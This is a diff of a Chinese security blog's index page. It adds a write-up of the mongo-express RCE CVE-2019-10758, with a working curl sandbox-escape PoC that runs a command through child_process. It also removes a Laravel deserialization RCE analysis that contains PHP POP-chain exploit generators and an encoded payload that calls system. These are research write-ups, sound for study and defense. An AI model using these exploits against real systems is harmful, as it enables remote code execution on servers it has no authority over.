@@ -416,7 +416,7 @@ console.log(&#39;[demo] start-quick is starting at port 3000&#39;)</code></pre><
             </div>
             <div class="continue">
             <a href="/2025/01/03/Node的一些应用技巧(持续更新)/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -594,7 +594,163 @@ echoName();</code></pre><p>为啥不是hpdoger呢？这是因为AO建立的逻�
             </div>
             <div class="continue">
             <a href="/2020/01/20/深入Javascript-作用域&Scope Chain/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2020/01/03/CVE-2019-10758-mongo-expressRCE复现分析/"> 
+                    CVE-2019-10758:mongo-expressRCE复现分析 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2020-01-03   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="CVE-2019-10758-mongo-expressRCE复现分析"><a href="#CVE-2019-10758-mongo-expressRCE复现分析" class="headerlink" title="CVE-2019-10758:mongo-expressRCE复现分析"></a>CVE-2019-10758:mongo-expressRCE复现分析</h1><p>早上室友说发了一则mongo-express的预警，正好看到陈师傅也发了twitter，动手分析一下，如有差错还望指正</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>漏洞环境:<br><a href="https://github.com/mongo-express/mongo-express#readme" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express#readme</a><br><a href="https://github.com/masahiro331/CVE-2019-10758" target="_blank" rel="noopener">https://github.com/masahiro331/CVE-2019-10758</a></p>
+<p>自己从官方拉到本地+mongodb的服务端或者docker起一个未授权的mongo端都可以，poc直接就能打出来</p>
+<pre><code>curl &#39;http://localhost:8081/checkValid&#39; -H &#39;Authorization: Basic YWRtaW46cGFzcw==&#39;  --data &#39;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&#39;</code></pre><p><img src="http://static.zybuluo.com/1160307775/1ofxgk12w4566n8105f5s2x9/image_1dto0qppb1f1v124r13mi1rugm8o5q.png" alt="image_1dto0qppb1f1v124r13mi1rugm8o5q.png-386.7kB"></p>
+<h1 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h1><p>文件<code>express-mongo/node_modules/mongo-express/lib/router.js</code>进行路由事件的方法绑定<br><img src="http://static.zybuluo.com/1160307775/77jhyl9xv7egdf09x00dvdiy/image_1dtnda3rm1r7412s61m5v1i71m5t3p.png" alt="image_1dtnda3rm1r7412s61m5v1i71m5t3p.png-617.2kB"></p>
+<p>路由事件checkvalid对应的方法在文件<code>express-mongo/node_modules/mongo-express/lib/routes/document.js</code>，调用了<code>toBSON</code></p>
+<p><img src="http://static.zybuluo.com/1160307775/fyz0jsczrxbneolxwpif75fk/image_1dtndcghv1ltvs581mfp1nfr11hu46.png" alt="image_1dtndcghv1ltvs581mfp1nfr11hu46.png-64.8kB"></p>
+<p>在toBSON函数中将传入的参数放进vm2沙箱里去eval</p>
+<pre><code>exports.toBSON = function (string) {
+  var sandbox = exports.getSandbox();
+
+  string = string.replace(/ISODate\(/g, &#39;new ISODate(&#39;);
+  string = string.replace(/Binary\((&quot;[^&quot;]+&quot;),/g, &#39;Binary(new Buffer($1, &quot;base64&quot;),&#39;);
+
+  vm.runInNewContext(&#39;doc = eval((&#39; + string + &#39;));&#39;, sandbox);
+
+  return sandbox.doc;
+};</code></pre><p>绕一下vm2逃逸出来沙箱即可，详情可以看这篇文章<a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">Sandboxing NodeJS is hard, here is why</a></p>
+<h1 id="其他触发点"><a href="#其他触发点" class="headerlink" title="其他触发点"></a>其他触发点</h1><p>还有一处对mongo传值的地方也存在bson的问题，只是要校验是否存在数据库&amp;表名，利用起来没有checkValid的链方便，不过大多数mongo库都会存在local的库+start_log这个collection</p>
+<p><img src="http://static.zybuluo.com/1160307775/eb2olwr7s4b04kmrsqhhvo1d/image_1dtr6dtch1t8kgrj1tq4c1jcivm.png" alt="image_1dtr6dtch1t8kgrj1tq4c1jcivm.png-375kB"></p>
+<h1 id="需不需要验证"><a href="#需不需要验证" class="headerlink" title="需不需要验证"></a>需不需要验证</h1><p><code>mongo-express</code>把原始config对象写在config.default.js文件中。</p>
+<p>漏洞分析中的poc需要进行权限鉴定，也就是poc中使用了请求头<code>Authorization: Basic YWRtaW46cGFzcw==</code>的原因。删掉后请求则会返回未授权</p>
+<p><img src="http://static.zybuluo.com/1160307775/diptzrofl46yjfld44z1m025/image_1dto2g2p7kj6121c18ci1h4vq9i77.png" alt="image_1dto2g2p7kj6121c18ci1h4vq9i77.png-63.4kB"></p>
+<p>但是如果以cli+指定用户形式启动服务端与mongo的连接时，则不需要授权也能打(个人认为这种方式更常见一点?)<br><img src="http://static.zybuluo.com/1160307775/so63suhp0hmj3thu9axhunmf/image_1du1fiujq1v2r1icnt5t3lctg69.png" alt="image_1du1fiujq1v2r1icnt5t3lctg69.png-524.8kB"></p>
+<p>下面是关于mongo-express调用<code>basic-auth-connect</code>的认证简单分析</p>
+<h2 id="认证流程分析"><a href="#认证流程分析" class="headerlink" title="认证流程分析"></a>认证流程分析</h2><p>程序入口逻辑是这样的，如果你程序启动的时候给一个-u&amp;-p参数则<code>config.useBasicAuth</code>为false，而<code>config.useBasicAuth</code>在加载配置的阶段默认为true</p>
+<pre><code>if (commander.username &amp;&amp; commander.password) {
+...
+config.useBasicAuth = false;
+}</code></pre><p>接着看文件<code>express-mongo/node_modules/mongo-express/lib/router.js</code>，根据<code>config.useBasicAuth</code>的值绑定一个<code>basicAuth</code>中间键，如果初始启动程序的时候没有-u/-p参数，则获取配置文件的username&amp;password(默认为admin:pass)来进行绑定</p>
+<p><img src="http://static.zybuluo.com/1160307775/s00s25eqbwv3p7idk9ei0xjs/image_1dtntgtmr1cep1la29dnuaevf45d.png" alt="image_1dtntgtmr1cep1la29dnuaevf45d.png-591kB"></p>
+<p>这里假设我们启动程序的时候默认不传入-u/-p，则步入<code>basicAuth</code>函数。这里定义了两个全局变量<code>username</code>&amp;<code>password</code>，来存储配置文件的用户名密码。</p>
+<pre><code>module.exports = function basicAuth(callback, realm) {
+  var username, password;
+
+  // user / pass strings
+  if (&#39;string&#39; == typeof callback) {
+    username = callback;
+    password = realm;
+    if (&#39;string&#39; != typeof password) throw new Error(&#39;password argument required&#39;);
+    realm = arguments[2];
+    callback = function(user, pass){
+      return user == username &amp;&amp; pass == password;
+    }
+  }
+
+  realm = realm || &#39;Authorization Required&#39;;
+
+  return function(req, res, next) {
+    var authorization = req.headers.authorization;
+
+    if (req.user) return next();
+    if (!authorization) return unauthorized(res, realm);
+
+    var parts = authorization.split(&#39; &#39;);
+
+    if (parts.length !== 2) return next(error(400));
+
+    var scheme = parts[0]
+      , credentials = new Buffer(parts[1], &#39;base64&#39;).toString()
+      , index = credentials.indexOf(&#39;:&#39;);
+
+    if (&#39;Basic&#39; != scheme || index &lt; 0) return next(error(400));
+
+    var user = credentials.slice(0, index)
+      , pass = credentials.slice(index + 1);
+
+    // async
+    if (callback.length &gt;= 3) {
+      callback(user, pass, function(err, user){
+        if (err || !user)  return unauthorized(res, realm);
+        req.user = req.remoteUser = user;
+        next();
+      });
+    // sync
+    } else {
+      if (callback(user, pass)) {
+        req.user = req.remoteUser = user;
+        next();
+      } else {
+        unauthorized(res, realm);
+      }
+    }
+  }
+};</code></pre><p>在这之后的所有请求则必须都要有<code>req.headers.authorization</code>，来与全局变量<code>username</code>&amp;<code>password</code>比对进行认证，否则返回Unauthorized。</p>
+<p>所以要想不进入<code>basicAuth</code>函数，只需要<code>config.useBasicAuth = false</code></p>
+<h2 id="cli启动-未授权"><a href="#cli启动-未授权" class="headerlink" title="cli启动-未授权"></a>cli启动-未授权</h2><p>在mongo-express中还有一种启动方式，即用命令行传递参数。<br><img src="http://static.zybuluo.com/1160307775/ju6aewyf8sm5po3yu3r18urz/image_1dto26qrj1bge18bm6o41o13bn667.png" alt="image_1dto26qrj1bge18bm6o41o13bn667.png-44.5kB"></p>
+<p>由于poc中，用docker拉的mongodb默认是未授权的形式，所以不需要-u&amp;-p来指定数据库的账号密码。但是实际环境中mongodb不太可能是未授权，所以我觉得以cli+参数启动服务的场景应该算是多见吧。</p>
+<p>那么如果受害者指定了用户名&amp;密码去启动express-mongo，那么攻击者直接未授权就可以打(即不需要指定authoriza header)</p>
+<p>不过在官方文档中给出了一句话:</p>
+<pre><code>You can use the following environment variables to modify the container&#39;s configuration</code></pre><p>因为config.default.js默认会从环境变量中加载mongodb的用户名&amp;密码，这样无需参数就能启动服务，也顺便避免了未授权的问题</p>
+<h1 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h1><p><a href="https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2</a></p>
+<p>在0.54.0中将bson.js中的vm依赖删除，改用<code>mongo-query-parser</code></p>
+<p><img src="http://static.zybuluo.com/1160307775/abenhjn0g17fc8ef5jlgjvd2/image_1dtohg4gq10ehc9k100fbfq11ok8u.png" alt="image_1dtohg4gq10ehc9k100fbfq11ok8u.png-32.5kB"></p>
+<h1 id="express分析"><a href="#express分析" class="headerlink" title="express分析"></a>express分析</h1><p>框架流程，使用一堆中间键</p>
+<p>然后启动流程就是对中间键的层级调用，具体看这篇文章:<a href="https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/" target="_blank" rel="noopener">https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/</a></p>
+<pre><code>核心的两步:
+layer.handle_request(req, res, next);
+
+/*
+handle_request定义的就是express应用中的路由中间件请求处理函数，也就是例如app.get(‘/test’, function(req, res, next){})的操作最后的执行位置。
+*/
+
+/*
+layer.handle_request会执行layer.route的dispatch操作，也就是在Route中派发路由最终执行到在express中定义的对应的路由操作函数，之后又执行next()就又到了这里的proto.stack中的下一个遍历操作。
+*/
+
+
+//handle_request原生是这样写的:
+
+Layer.prototype.handle_request = function handle(req, res, next) {
+  var fn = this.handle;
+
+  if (fn.length &gt; 3) {
+    // not a standard request handler
+    return next();
+  }
+
+  try {
+    fn(req, res, next);
+  } catch (err) {
+    next(err);
+  }
+};
+</code></pre>
+                
+            </div>
+            <div class="continue">
+            <a href="/2020/01/03/CVE-2019-10758-mongo-expressRCE复现分析/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -635,7 +791,7 @@ echoName();</code></pre><p>为啥不是hpdoger呢？这是因为AO建立的逻�
             </div>
             <div class="continue">
             <a href="/2020/01/01/My 2019/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -723,7 +879,7 @@ paths.opath = /flag</code></pre><p>构造一下就能把flag追加写入到sandb
             </div>
             <div class="continue">
             <a href="/2019/12/01/I-SOON2019-Membershop出题思路/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -884,7 +1040,7 @@ console.log(&#39;this is func&#39;)</code></pre><p><img src="http://static.zybul
             </div>
             <div class="continue">
             <a href="/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1051,7 +1207,7 @@ if (preg_match(&quot;#^data:image/(\w+);base64,(.*)$#&quot;, $src, $matches)) {
             </div>
             <div class="continue">
             <a href="/2019/10/20/字节跳动CTF线下赛Web题解&复盘/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1177,7 +1333,7 @@ setCookie(&quot;tag&quot;, tag);</code></pre><p>追到函数不难发现是tag�
             </div>
             <div class="continue">
             <a href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1619,7 +1775,7 @@ error_log(&#39;&#39;,1);
             </div>
             <div class="continue">
             <a href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1736,178 +1892,7 @@ if($enews==&quot;AddIndexpage&quot;)
             </div>
             <div class="continue">
             <a href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/"> 
-                    Laravel由destrcuct引起的两处反序列化RCE分析 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-08-25   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="Laravel由destrcuct引起的两处反序列化RCE分析"><a href="#Laravel由destrcuct引起的两处反序列化RCE分析" class="headerlink" title="Laravel由destrcuct引起的两处反序列化RCE分析"></a>Laravel由destrcuct引起的两处反序列化RCE分析</h1><p>文章首发于安全客:<a href="https://www.anquanke.com/post/id/184541" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184541</a></p>
-<p>laravel本身没有反序列化的调用机制，只有依赖于二次开发或者敏感函数才能触发反序列化。在Laravel5.3以后的版本引入<code>Illuminate\Broadcasting\PendingBroadcast.php</code>文件，存在__destrcut魔法函数引发一系列问题。这里我对框架本身能造成rce的点进行分析，一处是三方组件fzaninotto的回调调用<code>call_user_func_array</code>造成的rce，另一处是<br>p神在lumenserial找到laravel核心库的一处任意函数调用。</p>
-<h1 id="Laravel自加载组件fzaninotto组件RCE"><a href="#Laravel自加载组件fzaninotto组件RCE" class="headerlink" title="Laravel自加载组件fzaninotto组件RCE"></a>Laravel自加载组件fzaninotto组件RCE</h1><h2 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h2><p><code>fzaninotto</code>在laravel 5.1以后composer默认安装<br><img src="http://static.zybuluo.com/1160307775/fc1ugl8qu5rkggox43xanknq/image_1dhoajden1lhl1rrdc1i18qr82s9.png" alt="image_1dhoajden1lhl1rrdc1i18qr82s9.png-164.8kB"></p>
-<p><code>autoload_classmap.php</code>可以看到，在进行依赖加载的时候默认将<code>/fzaninotto/faker/src/Faker/Generator.php</code>注册到全局变量<code>$classmap</code>中，在程序调用相关类时遵从PSR4的规范，也就是说我们反序列化是可以调用<code>/fzaninotto/faker/src/Faker/</code>目录下的任何文件。</p>
-<p><img src="http://static.zybuluo.com/1160307775/zrpwx3p0q227if3wqkeaucgd/image_1dhoalu3vkne6bp7mf1nfj7qhm.png" alt="image_1dhoalu3vkne6bp7mf1nfj7qhm.png-751.3kB"></p>
-<h2 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h2><ul>
-<li>laravel 5.3-5.8</li>
-<li>寻找可控的反序列化点，才能触发该漏洞</li>
-</ul>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本地搭建laravel最新的环境 5.8.29<br><img src="http://static.zybuluo.com/1160307775/n45b5dlbpcdyukkok7h2sezo/image_1dhobbpoc1j5p1toc1rf71rd729l9.png" alt="image_1dhobbpoc1j5p1toc1rf71rd729l9.png-332kB"></p>
-<p>构造一个反序列化可控点，在<code>app/Http/Controllers</code>文件夹下创建文件TaskController.php，源码如下:</p>
-<pre><code>&lt;?php
-namespace App\Http\Controllers;
-
-class TaskController
-{
-    public function index(){
-        unserialize($_GET[&#39;url&#39;]);
-    }
-}</code></pre><p>在<code>routes/web.php</code>文件中添加这样路由记录</p>
-<pre><code>Route::get(&#39;/bug&#39;, &#39;TaskController@index&#39;);</code></pre><p><img src="http://static.zybuluo.com/1160307775/9txqyfac02ns2bq2tp9n9s8c/image_1dhoc20tt1p37lmb30g19m1s1v13.png" alt="image_1dhoc20tt1p37lmb30g19m1s1v13.png-234.4kB"></p>
-<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>&lt;?php
-//exp.php
-namespace Faker{
-    class Generator{
-        protected $formatters = array();
-
-        public function __construct($formatters)
-        {
-            $this-&gt;formatters = $formatters;
-        }
-    }
-}
-
-namespace Illuminate\Broadcasting{
-    class PendingBroadcast.php``
-    {
-        protected $events;
-        protected $event;
-
-        public function __construct($events, $event)
-        {
-            $this-&gt;events = $events;
-            $this-&gt;event = $event;
-        }
-
-    }
-}
-
-namespace{
-    $generator = new Faker\Generator(array(&quot;dispatch&quot;=&gt;&quot;system&quot;));
-    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($generator,&quot;id&quot;);
-    echo urlencode(serialize($PendingBroadcast));
-
-}</code></pre><p>运行exp.php生成poc，如果环境搭建没有问题，直接请求下面的uri既能看到rce效果</p>
-<pre><code>bug?url=O%3A40%3A&quot;Illuminate%5CBroadcasting%5CPendingBroadcast&quot;%3A2%3A%7Bs%3A9%3A&quot;%00%2A%00events&quot;%3BO%3A15%3A&quot;Faker%5CGenerator&quot;%3A1%3A%7Bs%3A13%3A&quot;%00%2A%00formatters&quot;%3Ba%3A1%3A%7Bs%3A8%3A&quot;dispatch&quot;%3Bs%3A6%3A&quot;system&quot;%3B%7D%7Ds%3A8%3A&quot;%00%2A%00event&quot;%3Bs%3A2%3A&quot;id&quot;%3B%7D</code></pre><p><img src="http://static.zybuluo.com/1160307775/ci645ofexwzuhhscrh6ix4bj/image_1dhocrcl7t951nqna0abdu19l71t.png" alt="image_1dhocrcl7t951nqna0abdu19l71t.png-97.7kB"></p>
-<h3 id="EXP流程"><a href="#EXP流程" class="headerlink" title="EXP流程"></a>EXP流程</h3><p>在入口设置断点，传入payload<br><img src="http://static.zybuluo.com/1160307775/endgg8ppidelbmgxxi0uj1po/image_1dhod29lhevt1urr1u8j8v1pf32a.png" alt="image_1dhod29lhevt1urr1u8j8v1pf32a.png-239.1kB"></p>
-<p>步入<code>Illuminate\Foundation\AliasLoader</code>的load函数，检测要实例的对象是否是laravel注册门面类，这里不满足条件<br><img src="http://static.zybuluo.com/1160307775/nipw8jf21ejjop49p2qvv1ss/image_1dhod50m81hlejqdltvv31ldd2n.png" alt="image_1dhod50m81hlejqdltvv31ldd2n.png-189.3kB"></p>
-<p>因此步入<code>Composer\Autoload\ClassLoader</code>查找相应class对应于vendor中的php文件。也就是上文提到的laravel在加载服务容器时会执行的<code>autoload_class</code>作用结果</p>
-<p><img src="http://static.zybuluo.com/1160307775/gnp5zqdryec1r1xm0swduzss/image_1dhoh4r22a9ln89upkgff5o53h.png" alt="image_1dhoh4r22a9ln89upkgff5o53h.png-531.1kB"></p>
-<p>看到调用栈能够成功读取到<code>Faker\Generato</code>文件，并返回给includefile()</p>
-<p>载入文件后步入到了反序列化的入口__destruct函数<br><img src="http://static.zybuluo.com/1160307775/xer6dqy2miqhm9n65n4f6ryi/image_1dhohl8c1b005lhch91ier1sij4o.png" alt="image_1dhohl8c1b005lhch91ier1sij4o.png-261.2kB"></p>
-<p>步入执行dispatch函数，跳转到<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>的call方法<br><img src="http://static.zybuluo.com/1160307775/7mscxmikz6sh3m5vm6n71aga/image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png" alt="image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png-347.9kB"></p>
-<p>跟进format函数如下图，发现此时的$arguments为可控值即我们序列化传入的$this-&gt;event<br><img src="http://static.zybuluo.com/1160307775/b913247o6m4bapk67pg329k8/image_1dhohhel0113lp9j14iq1o7g1deg4b.png" alt="image_1dhohhel0113lp9j14iq1o7g1deg4b.png-436.8kB"></p>
-<p>继续步入看看getFormatter函数的具体实现</p>
-<pre><code>public function getFormatter($formatter) # formatter  = dispatch
-{
-    if (isset($this-&gt;formatters[$formatter])) { # formatters可控
-        return $this-&gt;formatters[$formatter];
-    }
-    foreach ($this-&gt;providers as $provider) {
-        if (method_exists($provider, $formatter)) {
-            $this-&gt;formatters[$formatter] = array($provider, $formatter);
-
-            return $this-&gt;formatters[$formatter];
-        }
-    }
-    throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));
-}</code></pre><p>判断formatters[formatter]存在即返回，然而formatters也是我们可控的，那就能返回任意函数名了。即call_user_func_arrary的函数名和函数值都可控，rce实现～<br><img src="http://static.zybuluo.com/1160307775/n5f8fm6zdtweygg047xhitdb/image_1dhoj1sdkbh3110j1vmq123efuf65.png" alt="image_1dhoj1sdkbh3110j1vmq123efuf65.png-95.9kB"></p>
-<h1 id="Dispatcher处存在任意函数调用"><a href="#Dispatcher处存在任意函数调用" class="headerlink" title="Dispatcher处存在任意函数调用"></a>Dispatcher处存在任意函数调用</h1><p>首先还是看一下造成漏洞的点在<code>vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php</code>，允许我们使用<code>call_user_func</code>进行任意函数调用，且参数可控。<br><img src="http://static.zybuluo.com/1160307775/ceenl8t6uw3aipnvsc9x93p8/image_1dhnv8s401hhqdai12u51uqgia1p.png" alt="image_1dhnv8s401hhqdai12u51uqgia1p.png-110.2kB"></p>
-<p>接着我们从源头追pop。入口方法依然在<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code>中，__destrcut执行dispatch函数<br><img src="http://static.zybuluo.com/1160307775/pdv4vp3nt9no1k94wb5jujkc/image_1dhnvcu1b1koj1f5o3oh9e1blr16.png" alt="image_1dhnvcu1b1koj1f5o3oh9e1blr16.png-108.5kB"></p>
-<p>这次全局搜索哪些类存在dispatch函数，正好dispatcher本身中就存在，而且调用到了漏洞触发函数<code>dispatchToQueue</code>去执行<code>call_user_func</code></p>
-<p><img src="http://static.zybuluo.com/1160307775/3vrpkiph81avi6cc2187ao5l/image_1dhnvi8t69udppb8bdhpo1sq11j.png" alt="image_1dhnvi8t69udppb8bdhpo1sq11j.png-167.8kB"></p>
-<p>这里首先进行了如下条件判断</p>
-<pre><code>$this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)</code></pre><p>跟进<code>commandShouldBeQueued</code>发现command参数必须是继承自    <code>ShouldQueue</code>接口的对象才能进入判断，这点我们可以通过序列化控制$command为对象。<br><img src="http://static.zybuluo.com/1160307775/9szugjpwpov3c0v9bj9r5so6/image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png" alt="image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png-34.1kB"></p>
-<p>只需要全局搜一下哪个类实现了<code>ShouldQueue</code>接口，这里使用<code>BroadcastEvent</code><br><img src="http://static.zybuluo.com/1160307775/7b6akvknkvytxn922rfymihj/image_1dho0anindq2h3e12jnoj3vl23t.png" alt="image_1dho0anindq2h3e12jnoj3vl23t.png-228.8kB"></p>
-<p>判断走通回到dispather，进行函数<code>dispatchToQueue</code>调用，<code>$connection</code>参数取自<code>$command</code>的connection属性<br><img src="http://static.zybuluo.com/1160307775/er9kg4fp6hp4rdcgorvkjfut/image_1dho0e2svl3kjdg166r1qv61cae4a.png" alt="image_1dho0e2svl3kjdg166r1qv61cae4a.png-137.1kB"></p>
-<p>但是<code>BroadcastEvent</code>没有connection属性。不过没有关系，我们自己序列化可以给类添加任何想要的属性。因为反序列化的时候不执行该类__contrust，自然也不会在<code>BroadcastEvent</code>中报错。</p>
-<p>流程就这么简单，构造每个类的属性，让条件走通就行了。构造的exp</p>
-<pre><code>&lt;?php
-
-namespace Illuminate\Broadcasting{
-    class PendingBroadcast
-    {
-        protected $events;
-        protected $event;
-
-        public function __construct($events, $event)
-        {
-            $this-&gt;events = $events;
-            $this-&gt;event = $event;
-        }
-
-    }
-
-    class BroadcastEvent
-    {
-      protected $connection;
-
-      public function __construct($connection)
-      {
-        $this-&gt;connection = $connection;
-      }
-    }
-
-}
-
-namespace Illuminate\Bus{
-    class Dispatcher{
-        protected $queueResolver;
-
-        public function __construct($queueResolver)
-        {
-          $this-&gt;queueResolver = $queueResolver;
-        }
-
-    }
-}
-
-namespace{
-    $command = new Illuminate\Broadcasting\BroadcastEvent(&quot;whoami&quot;);
-
-    $dispater = new Illuminate\Bus\Dispatcher(&quot;system&quot;);
-
-    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
-
-    echo urlencode(serialize($PendingBroadcast));
-
-}</code></pre><p>只不过是没有回显，需要我们可以外带出去，这里调试的结果成功执行system获取whoami为hpdoger<br><img src="http://static.zybuluo.com/1160307775/72f5906tt0oafrk68hj4q2yl/image_1dho0phn5uka1c5316dv1g8n1ckr4n.png" alt="image_1dho0phn5uka1c5316dv1g8n1ckr4n.png-351.9kB"></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1915,7 +1900,7 @@ namespace{
 </section>
 
   <nav class="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
   </nav>
 
     </main>
